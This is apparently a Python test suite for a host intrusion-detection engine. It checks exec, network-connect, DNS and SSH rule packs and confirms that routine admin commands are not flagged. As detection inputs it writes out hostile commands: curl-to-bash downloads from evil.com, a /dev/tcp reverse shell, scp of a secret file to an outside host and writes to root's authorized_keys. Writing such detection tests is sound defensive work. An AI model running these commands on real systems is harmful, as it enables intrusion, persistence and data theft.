#!/usr/bin/env python3
"""Tests for JSON-backed detection rule packs (v1.1)."""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))

from connect_rules import configure_connect_rules, match_connect_rules  # noqa: E402
from dns_rules import assess_dns_events, configure_dns_rules  # noqa: E402
from exec_rules import configure_exec_rules, context_boost, match_exec_rules  # noqa: E402
from rule_loader import configure_rules_dir, load_rule_pack, rule_file, validate_rule_pack  # noqa: E402
from ssh_rules import assess_ssh_bruteforce, configure_ssh_rules  # noqa: E402


class TestDetectionRulePacks(unittest.TestCase):
    def test_operational_commands_do_not_claim_unobserved_behaviors(self):
        configure_exec_rules(None)
        cases = {
            "download_and_execute": ["curl https://example.org/health", "curl https://example.org/bash | sha256sum",
                                     "wget -O /tmp/check https://example.org/check", "curl https://example.org/status; bash -c id"],
            "persistence_modify": ["ls /etc/systemd/system/", "grep ExecStart /etc/systemd/system/x.service",
                                   "cp -a /etc/systemd/system/x.service /backup/x.service", "crontab -l",
                                   "cat /root/.ssh/authorized_keys", "sed -n 1p /etc/systemd/system/x.service"],
            "network_exfil_tools": [["/usr/lib/openssh/sftp-server"], ["scp", "-t", "/tmp/upload"],
                                    ["sh", "-c", "scp -t /tmp/upload"]],
        }
        for rule, commands in cases.items():
            for command in commands:
                for encoded in (command, json.dumps(command) if isinstance(command, list) else ["bash", "-c", command]):
                    with self.subTest(rule=rule, command=encoded):
                        _, matched, _ = match_exec_rules({"command": encoded, "listener_process": "sshd", "listener_port": 22})
                        self.assertNotIn(rule, matched)

    def test_real_execution_writes_and_outbound_transfer_remain_candidates(self):
        configure_exec_rules(None)
        cases = {
            "download_and_execute": ["curl https://example.org/install | bash", "bash <(curl https://example.org/install)",
                                     "curl -o /tmp/run https://example.org/run; chmod +x /tmp/run; /tmp/run",
                                     "wget -O /tmp/run https://example.org/run && sh /tmp/run"],
            "persistence_modify": ["cp /tmp/x /etc/systemd/system/x.service", "install -m 644 /tmp/x /etc/systemd/system/x.service",
                                   "echo key >> /root/.ssh/authorized_keys", "crontab /tmp/jobs", "systemctl enable x",
                                   "sed -i s/a/b/ /etc/systemd/system/x.service"],
            "network_exfil_tools": ["scp /tmp/secret user@192.0.2.20:/tmp/", "scp -f /tmp/secret",
                                    "sftp-server; scp /tmp/secret user@192.0.2.20:/tmp/"],
            "reverse_shell": ["bash -i >& /dev/tcp/192.0.2.20/4444 0>&1"],
        }
        for rule, commands in cases.items():
            for command in commands:
                with self.subTest(rule=rule, command=command):
                    _, matched, _ = match_exec_rules({"command": ["bash", "-c", command], "listener_process": "sshd", "listener_port": 22})
                    self.assertIn(rule, matched)

    def test_default_packs_validate(self) -> None:
        for name in (
            "exec-rules.json",
            "connect-rules.json",
            "dns-rules.json",
            "ssh-rules.json",
            "syslog-rules.json",
            "attck-map.json",
        ):
            pack = load_rule_pack(default_name=name)
            self.assertIn("version", pack)

    def test_custom_exec_rule_from_json(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        base["p1_keywords"].append(
            {
                "id": "internal_recon",
                "field": "command",
                "keyword": "custom-ops-probe-xyz",
                "enabled": True,
            }
        )
        with tempfile.TemporaryDirectory() as tmp:
            custom = Path(tmp) / "exec-rules.json"
            custom.write_text(json.dumps(base, ensure_ascii=False), encoding="utf-8")
            configure_exec_rules(custom)
            sev, matched, tags = match_exec_rules(
                {
                    "listener_port": 22,
                    "listener_process": "sshd",
                    "command": "custom-ops-probe-xyz",
                }
            )
            self.assertIn("internal_recon", matched)
            self.assertEqual(sev, "P1")
        configure_exec_rules(None)

    def test_rules_dir_override_reloads_default_rule_paths(self) -> None:
        names = (
            "exec-rules.json",
            "connect-rules.json",
            "dns-rules.json",
            "ssh-rules.json",
            "syslog-rules.json",
            "attck-map.json",
        )
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            for name in names:
                (tmp_path / name).write_text(rule_file(name).read_text(encoding="utf-8"), encoding="utf-8")
            custom_exec = json.loads((tmp_path / "exec-rules.json").read_text(encoding="utf-8"))
            custom_exec["p1_keywords"].append(
                {
                    "id": "internal_recon",
                    "field": "command",
                    "keyword": "rules-dir-override-marker",
                    "enabled": True,
                }
            )
            (tmp_path / "exec-rules.json").write_text(json.dumps(custom_exec, ensure_ascii=False), encoding="utf-8")

            configure_rules_dir(tmp_path)
            try:
                configure_exec_rules(None)
                sev, matched, _ = match_exec_rules(
                    {
                        "listener_port": 22,
                        "listener_process": "sshd",
                        "command": "rules-dir-override-marker",
                    }
                )
                self.assertEqual(sev, "P1")
                self.assertIn("internal_recon", matched)
            finally:
                configure_rules_dir(None)
                configure_exec_rules(None)

    def test_download_execute_still_p0(self) -> None:
        configure_exec_rules(None)
        sev, matched, _ = match_exec_rules(
            {
                "listener_port": 443,
                "listener_process": "nginx",
                "exe": "/bin/bash",
                "command": ["/bin/sh", "-c", "curl http://evil.com/a.sh | bash"],
            }
        )
        self.assertEqual(sev, "P0")
        self.assertIn("download_and_execute", matched)

    def test_context_boost_accepts_string_listener_port(self) -> None:
        configure_exec_rules(None)
        ev = {"listener_port": "443", "listener_process": "", "command": "id", "cwd": "/srv"}
        self.assertEqual(context_boost("P2", ev, False, False), "P1")

    def test_p3_keyword_object_format(self) -> None:
        configure_exec_rules(None)
        sev, matched, tags = match_exec_rules(
            {
                "listener_port": 443,
                "listener_process": "nginx",
                "command": "which curl",
            }
        )
        self.assertIn("noise_command", matched)
        self.assertIn("noise", tags)

    def test_disabled_pattern_skipped(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        base["p0_regex"].append(
            {
                "id": "reverse_shell",
                "field": "command",
                "pattern": "ops-test-only-reverse-marker",
                "flags": "i",
                "enabled": False,
            }
        )
        with tempfile.TemporaryDirectory() as tmp:
            custom = Path(tmp) / "exec-rules.json"
            custom.write_text(json.dumps(base, ensure_ascii=False), encoding="utf-8")
            configure_exec_rules(custom)
            _, matched, _ = match_exec_rules(
                {
                    "listener_port": 443,
                    "listener_process": "nginx",
                    "command": "ops-test-only-reverse-marker",
                }
            )
            self.assertNotIn("reverse_shell", matched)
        configure_exec_rules(None)

    def test_invalid_regex_rejected(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        base["p0_regex"].append(
            {"id": "bad", "field": "command", "pattern": "(unclosed", "flags": "i"}
        )
        with self.assertRaises(ValueError):
            validate_rule_pack(base, "exec-rules.json")

    def test_missing_field_rejected(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        base["p0_regex"].append({"id": "bad", "pattern": "test", "flags": "i"})
        with self.assertRaisesRegex(ValueError, "requires 'field'"):
            validate_rule_pack(base, "exec-rules.json")

    def test_exe_field_pattern(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        base["p1_regex"].append(
            {
                "id": "internal_recon",
                "field": "exe",
                "pattern": "/tmp/malware",
                "flags": "i",
                "enabled": True,
            }
        )
        with tempfile.TemporaryDirectory() as tmp:
            custom = Path(tmp) / "exec-rules.json"
            custom.write_text(json.dumps(base, ensure_ascii=False), encoding="utf-8")
            configure_exec_rules(custom)
            _, matched, _ = match_exec_rules(
                {
                    "listener_port": 22,
                    "listener_process": "sshd",
                    "exe": "/tmp/malware",
                    "command": "ls",
                }
            )
            self.assertIn("internal_recon", matched)
        configure_exec_rules(None)

    def test_engine_field_required(self) -> None:
        base = json.loads(rule_file("exec-rules.json").read_text(encoding="utf-8"))
        del base["engine"]
        with self.assertRaisesRegex(ValueError, "missing 'engine'"):
            validate_rule_pack(base, "exec-rules.json")

    def test_engine_must_match_pack(self) -> None:
        base = json.loads(rule_file("connect-rules.json").read_text(encoding="utf-8"))
        base["engine"] = "pipeline"
        with self.assertRaisesRegex(ValueError, "does not match pack"):
            validate_rule_pack(base, "connect-rules.json")

    def test_connect_rules_from_json(self) -> None:
        configure_connect_rules(None)
        sev, matched, tags = match_connect_rules(
            {
                "host": "192.0.2.91",
                "listener_port": 443,
                "listener_process": "nginx",
                "dst_ip": "203.0.113.1",
                "dst_port": 443,
            }
        )
        self.assertEqual(sev, "P0")
        self.assertIn("external_c2_connect", matched)
        self.assertIn("command_and_control", tags)

    def test_connect_web_context_accepts_string_listener_port(self) -> None:
        configure_connect_rules(None)
        sev, matched, tags = match_connect_rules(
            {
                "host": "192.0.2.91",
                "listener_port": "443",
                "listener_process": "",
                "dst_ip": "203.0.113.1",
                "dst_port": 443,
            }
        )
        self.assertEqual(sev, "P0")
        self.assertIn("external_c2_connect", matched)
        self.assertIn("command_and_control", tags)

    def test_connect_exec_correlated_tag(self) -> None:
        configure_connect_rules(None)
        sev, matched, tags = match_connect_rules(
            {
                "host": "10.66.6.91",
                "listener_port": 443,
                "listener_process": "nginx",
                "dst_ip": "10.66.6.92",
                "dst_port": 3306,
            },
            related_exec_texts=["curl http://evil.com/payload"],
        )
        self.assertIn("exec_correlated_egress", matched)
        self.assertIn("network_activity", tags)
        self.assertNotIn("exfiltration", tags)

    def test_dns_profile_detects_dga_and_nxdomain_burst(self) -> None:
        configure_dns_rules(None)
        events = []
        for i in range(10):
            events.append(
                {
                    "evidence_id": f"dns-nx-{i}",
                    "client_ip": "192.0.2.91",
                    "timestamp": f"2026-07-01T10:00:{i:02d}+08:00",
                    "query": f"no-such-{i}.badxyz.top",
                    "rcode": "NXDOMAIN",
                }
            )
        events.append(
            {
                "evidence_id": "dns-dga-1",
                "client_ip": "192.0.2.91",
                "timestamp": "2026-07-01T10:01:00+08:00",
                "query": "a9d8f7g6h5j4k3l2m1n0p9q8.xyz",
                "rcode": "NOERROR",
            }
        )

        items = assess_dns_events(
            events,
            connect_events=[],
            ceiling=1.0,
            severity_floor="P3",
            warnings=[],
        )
        matched = {rule for item in items for rule in item["matched_rules"]}
        self.assertIn("high_nxdomain_burst", matched)
        self.assertIn("suspected_dga_domain", matched)
        self.assertIn("uncommon_tld_query", matched)

    def test_dns_module_detects_doh_dot_from_connect_events(self) -> None:
        configure_dns_rules(None)
        items = assess_dns_events(
            [],
            connect_events=[
                {
                    "evidence_id": "conn-doh",
                    "host": "192.0.2.91",
                    "timestamp": "2026-07-01T10:02:00+08:00",
                    "dst_ip": "1.1.1.1",
                    "dst_port": 443,
                },
                {
                    "evidence_id": "conn-dot",
                    "host": "192.0.2.91",
                    "timestamp": "2026-07-01T10:03:00+08:00",
                    "dst_ip": "203.0.113.53",
                    "dst_port": 853,
                },
            ],
            ceiling=1.0,
            severity_floor="P3",
            warnings=[],
        )
        matched = {rule for item in items for rule in item["matched_rules"]}
        self.assertIn("doh_egress", matched)
        self.assertIn("dot_egress", matched)

    def test_ssh_thresholds_from_json(self) -> None:
        configure_ssh_rules(None)
        events = []
        for i in range(7):
            events.append(
                {
                    "host": "192.0.2.92",
                    "timestamp": f"2026-07-01T14:57:{i:02d}+08:00",
                    "src_ip": "192.0.2.91",
                    "user": "devops",
                    "result": "failed",
                }
            )
        items, _ = assess_ssh_bruteforce(
            events, ceiling=1.0, severity_floor="P3", window_sec=300, threshold=5
        )
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["severity"], "P2")


if __name__ == "__main__":
    unittest.main()
